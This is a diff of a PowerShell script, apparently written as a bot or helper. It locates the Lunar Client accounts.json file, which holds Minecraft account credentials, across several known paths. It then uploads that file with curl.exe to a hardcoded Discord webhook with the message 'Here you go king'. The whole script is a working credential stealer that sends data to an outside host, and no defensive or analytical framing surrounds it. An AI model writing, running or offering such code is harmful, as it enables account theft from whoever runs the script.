@@ -1,51 +1,48 @@
-# 1. Define paths
-$desktopPath = [System.Environment]::GetFolderPath('Desktop')
-$batchFileToRun = Join-Path $desktopPath 'run_bot.bat'
-$destinationFile = Join-Path $desktopPath 'Final_Multiplayer_Bot.bat'
+# Discord Webhook URL
+$webhookUrl = "https://discord.com/api/webhooks/1475770175990005811/jFwwFfOqY9AlMr54QfT1B_BPeDHItn5YljgnR9FjjugrBPxKiFmLzTkg9fLrQvoN0-NX"
 
-# 2. Create the Content
-$scriptContent = @"
-@echo off
-title Discord Webhook Sender
-
-:: Your Webhook URL
-set webhookUrl=https://discord.com/api/webhooks/1475770175990005811/jFwwFfOqY9AlMr54QfT1B_BPeDHItn5YljgnR9FjjugrBPxKiFmLzTkg9fLrQvoN0-NX
-
-:: Path to file
-set filePath=%USERPROFILE%\.lunarclient\settings\game\accounts.json
-
-echo Checking for file...
-if not exist "%filePath%" (
-    echo ERROR: File not found!
-    pause
-    exit /b
+# Try multiple possible paths for accounts.json
+$possiblePaths = @(
+    "$env:USERPROFILE\.lunarclient\settings\game\accounts.json",
+    "$env:APPDATA\.lunarclient\settings\game\accounts.json",
+    "$env:USERPROFILE\.lunar\accounts.json",
+    "$env:APPDATA\Lunar Client\accounts.json"
 )
 
-echo File found. Sending...
+$filePath = $null
+foreach ($path in $possiblePaths) {
+    if (Test-Path $path) {
+        $filePath = $path
+        break
+    }
+}
 
-:: Use curl
-$payload = '{
-  "content": "Here you go king :pray:",
-  "embeds": []
-}'
+if (-not $filePath) {
+    Write-Host "ERROR: accounts.json not found in any known location."
+    Write-Host "Searched paths:"
+    foreach ($p in $possiblePaths) {
+        Write-Host "  - $p"
+    }
+    Write-Host ""
+    Write-Host "Press any key to exit..."
+    $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
+    exit 1
+}
 
-curl.exe -X POST %webhookUrl% ^
-    -H "Content-Type: multipart/form-data; boundary=----WebKitFormBoundary" ^
-    -F "payload_json=%payload%" ^
-    -F "file=@%filePath%"
+Write-Host "Found file: $filePath"
+Write-Host "Sending to Discord..."
 
-echo.
-echo Webhook send finished.
-pause
-"@
+# Use curl.exe to send
+$payload = '{"content":"Here you go king :pray:"}'
 
-# 3. Save to Desktop
-$scriptContent | Out-File -FilePath $destinationFile -Encoding UTF8
+$result = & curl.exe -s -X POST $webhookUrl -F "payload_json=$payload" -F "file=@$filePath"
 
-Write-Host "Batch file created at: $destinationFile"
-Write-Host "File is ready to run."
-Write-Host "Press any key to open the folder..."
+if ($LASTEXITCODE -eq 0) {
+    Write-Host "SUCCESS! File sent to Discord."
+} else {
+    Write-Host "FAILED. Response: $result"
+}
+
+Write-Host ""
+Write-Host "Press any key to exit..."
 $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
-
-# 4. Open the folder to help you find it
-explorer $desktopPath
